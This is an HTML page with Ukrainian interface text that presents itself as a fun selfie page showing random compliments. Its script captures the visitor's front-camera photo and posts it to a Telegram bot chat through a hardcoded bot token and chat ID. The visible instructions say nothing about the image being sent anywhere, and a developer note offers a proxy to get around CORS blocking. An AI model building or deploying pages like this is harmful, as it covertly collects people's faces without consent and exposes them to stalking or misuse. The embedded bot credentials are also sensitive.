<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="utf-8" />
  <title>AutoSelfie → Telegram (модальне повідомлення)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root{
      --bg:#0f1720; --card:#0b1220; --accent:#2563eb; --muted:#9fb0c8; --text:#e6eef8;
      --modal-bg: rgba(5,10,18,0.85);
    }
    html,body{height:100%;margin:0}
    body{
      font-family:system-ui,Segoe UI,Roboto,Arial;
      background:var(--bg);
      color:var(--text);
      display:flex;
      justify-content:center;
      padding:20px;
    }
    .card{
      background:var(--card);
      border:1px solid #1f2a3a;
      padding:18px;
      border-radius:12px;
      max-width:820px;
      width:100%;
      box-sizing:border-box;
    }
    header img{
      max-width:100%;
      border-radius:10px;
      margin-bottom:8px;
      display:block;
    }
    .caption-area{margin:8px 0 14px 0}
    .caption-area .static-text{color:var(--muted);font-size:14px}
    video{width:100%;max-width:480px;border-radius:10px;background:#000;display:none}
    canvas{width:100%;max-width:480px;border-radius:10px;background:#000;display:none;margin-top:12px}
    .controls{margin-top:12px}
    button{
      padding:12px 18px;border-radius:8px;border:none;background:var(--accent);
      color:#fff;font-size:16px;cursor:pointer;width:100%;
    }
    button:disabled{opacity:.6;cursor:default}
    .note{font-size:13px;color:var(--muted);margin-top:10px}

    /* Модальне вікно */
    .modal {
      position:fixed;
      inset:0;
      display:none;
      align-items:center;
      justify-content:center;
      background:var(--modal-bg);
      z-index:9999;
      padding:20px;
    }
    .modal.open { display:flex; }
    .modal-card{
      background:#07101a;
      border-radius:12px;
      padding:16px;
      max-width:720px;
      width:100%;
      box-sizing:border-box;
      display:flex;
      gap:12px;
      align-items:flex-start;
    }
    .modal-card img{
      width:160px;
      height:160px;
      object-fit:cover;
      border-radius:8px;
      background:#000;
      border:1px solid #223;
      flex:0 0 160px;
    }
    .modal-content{
      color:var(--text);
      font-size:16px;
      line-height:1.3;
      flex:1 1 auto;
    }
    .modal-actions{
      display:flex;
      gap:8px;
      margin-top:12px;
    }
    .btn-close{
      padding:8px 12px;border-radius:8px;border:none;background:#334155;color:#fff;cursor:pointer;
    }
    .btn-ok{
      padding:8px 12px;border-radius:8px;border:none;background:#10b981;color:#fff;cursor:pointer;
    }
  </style>
</head>
<body>
  <div class="card">
    <header>
      <img id="topImage" src="" alt="Статична картинка">
    </header>

    <div class="caption-area">
      <div class="static-text" id="staticText">Натисни кнопку, дозволь камеру, потім натисни «Зробити фото». Після зйомки з'явиться випадкове спливаюче повідомлення з картинкою.</div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <div class="controls">
      <button id="actionBtn">Надати доступ до камери</button>
    </div>

    <p class="note">Працює через HTTPS або localhost. Якщо Telegram блокує запит (CORS), скажи — дам proxy.</p>
  </div>

  <!-- Модальне спливаюче вікно -->
  <div id="modal" class="modal" role="dialog" aria-modal="true">
    <div class="modal-card" role="document">
      <img id="modalImage" src="" alt="Рандомна картинка">
      <div class="modal-content">
        <div id="modalText">Тут буде випадкове повідомлення.</div>
        <div class="modal-actions">
          <button id="modalOk" class="btn-ok">ОК</button>
          <button id="modalClose" class="btn-close">Закрити</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    // ====== Налаштування (встав свої дані сюди) ======
    const BOT_TOKEN = "8506109550:AAGjHAChPn0IFIdL24s9PauJfwk9F9mV-_Y";
    const CHAT_ID = "1178810140";
    const IMAGE_SRC = ""; // статична картинка зверху (URL або data URI)
    const STATIC_TEXT = "Натисни кнопку, дозволь камеру, потім натисни «Зробити фото».";
    // База з 12 повідомлень і 12 картинок (приклади). Замінити URL на свої при потребі.
    const RANDOM_MESSAGES = [
      "Ти виглядаєш чудово сьогодні!",
      "Нехай цей день принесе тобі удачу.",
      "Посміхнися — це твоя суперсила.",
      "Нехай мрії стають реальністю.",
      "Ти робиш світ кращим своїм виглядом.",
      "Коротка пауза для натхнення — ти справжній.",
      "Нехай кожен кадр буде пам'ятним.",
      "Твоя енергія заряджає навколо.",
      "Зроби глибокий вдих — і вперед.",
      "Ти вже на крок ближче до мети.",
      "Нехай сьогодні буде день сюрпризів.",
      "Твоя посмішка — найкращий фільтр."
    ];
    const RANDOM_IMAGES = [
      "https://via.placeholder.com/480x480.png?text=Img+1",
      "https://via.placeholder.com/480x480.png?text=Img+2",
      "https://via.placeholder.com/480x480.png?text=Img+3",
      "https://via.placeholder.com/480x480.png?text=Img+4",
      "https://via.placeholder.com/480x480.png?text=Img+5",
      "https://via.placeholder.com/480x480.png?text=Img+6",
      "https://via.placeholder.com/480x480.png?text=Img+7",
      "https://via.placeholder.com/480x480.png?text=Img+8",
      "https://via.placeholder.com/480x480.png?text=Img+9",
      "https://via.placeholder.com/480x480.png?text=Img+10",
      "https://via.placeholder.com/480x480.png?text=Img+11",
      "https://via.placeholder.com/480x480.png?text=Img+12"
    ];
    // ================================================

    const actionBtn = document.getElementById('actionBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const topImage = document.getElementById('topImage');
    const staticTextEl = document.getElementById('staticText');

    const modal = document.getElementById('modal');
    const modalImage = document.getElementById('modalImage');
    const modalText = document.getElementById('modalText');
    const modalClose = document.getElementById('modalClose');
    const modalOk = document.getElementById('modalOk');

    if (IMAGE_SRC) topImage.src = IMAGE_SRC; else topImage.style.display = "none";
    staticTextEl.textContent = STATIC_TEXT;

    let stream = null;
    let cameraActive = false;
    let modalTimer = null;

    function isSecure(){
      return location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
    }

    async function stopStream(){
      if (stream) {
        try { stream.getTracks().forEach(t => t.stop()); } catch(e){ console.warn(e); }
      }
      stream = null;
      video.srcObject = null;
      video.style.display = "none";
    }

    function waitForVideoFrameReady(videoEl, timeout = 4000) {
      return new Promise((resolve, reject) => {
        const start = Date.now();
        if (videoEl.requestVideoFrameCallback) {
          videoEl.requestVideoFrameCallback(() => resolve());
          return;
        }
        const check = () => {
          if (videoEl.readyState >= 2 && videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
            resolve();
          } else if (Date.now() - start > timeout) {
            reject(new Error('timeout waiting for video frame'));
          } else {
            requestAnimationFrame(check);
          }
        };
        check();
      });
    }

    async function startCamera(){
      if (!isSecure()) {
        alert('getUserMedia працює лише в безпечному контексті (HTTPS або localhost).');
        return false;
      }
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = stream;
        try { await video.play(); } catch(e){ /* ignore */ }
        await waitForVideoFrameReady(video, 5000);
        video.style.display = "block";
        canvas.style.display = "none";
        cameraActive = true;
        actionBtn.textContent = "Зробити фото";
        return true;
      } catch (err) {
        console.error('startCamera error', err);
        alert('Не вдалося отримати доступ до камери. Перевір дозволи.');
        return false;
      }
    }

    function pickRandomIndex(){
      const n = Math.min(RANDOM_MESSAGES.length, RANDOM_IMAGES.length);
      return Math.floor(Math.random() * n);
    }

    function showModalWithRandom(){
      const idx = pickRandomIndex();
      modalImage.src = RANDOM_IMAGES[idx];
      modalText.textContent = RANDOM_MESSAGES[idx];
      modal.classList.add('open');

      // Автозакриття через 6 секунд
      clearTimeout(modalTimer);
      modalTimer = setTimeout(() => closeModal(), 6000);
    }

    function closeModal(){
      modal.classList.remove('open');
      clearTimeout(modalTimer);
    }

    async function takePhotoAndSend(){
      if (!cameraActive) return;
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');

      ctx.drawImage(video, 0, 0, w, h);
      canvas.style.display = "block";

      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
      if (!blob) {
        alert('Не вдалося сформувати зображення.');
        return;
      }

      // Відправка селфі в Telegram
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', blob, 'selfie.png');

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

      try {
        const resp = await fetch(url, { method: 'POST', body: form });
        if (!resp.ok) {
          const text = await resp.text().catch(()=>'[no body]');
          console.error('Telegram send error', resp.status, text);
          alert('Відправка селфі неуспішна. Можлива проблема з CORS або токен/чат невірні.');
        } else {
          // Показуємо модальне вікно з випадковим повідомленням і картинкою
          showModalWithRandom();
        }
      } catch (err) {
        console.error('send error', err);
        alert('Помилка мережі або блокування CORS. Повідом мене — дам proxy.');
      } finally {
        // Зупиняємо камеру після зйомки
        await stopStream();
        cameraActive = false;
        actionBtn.textContent = "Надати доступ до камери";
      }
    }

    actionBtn.addEventListener('click', async () => {
      if (!cameraActive) {
        await startCamera();
      } else {
        await takePhotoAndSend();
      }
    });

    modalClose.addEventListener('click', closeModal);
    modalOk.addEventListener('click', closeModal);

    // Закрити модал при кліку поза карткою
    modal.addEventListener('click', (e) => {
      if (e.target === modal) closeModal();
    });

    // Додатково: закрити клавішею Escape
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') closeModal();
    });
  </script>
</body>
  </html>
